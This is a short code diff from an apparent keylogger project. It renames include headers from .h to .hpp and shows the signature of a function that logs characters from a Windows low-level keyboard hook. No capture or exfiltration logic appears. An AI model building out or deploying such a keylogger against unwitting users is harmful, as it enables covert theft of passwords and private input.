@@ -1,7 +1,7 @@
-#include "keylogger.h"
-#include "keyboard.h"
-#include "configuration.h"
-#include "constants.h"
+#include "keylogger.hpp"
+#include "keyboard.hpp"
+#include "configuration.hpp"
+#include "constants.hpp"
 
 // Logs the respective characters of the provided KBD hook.
 void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
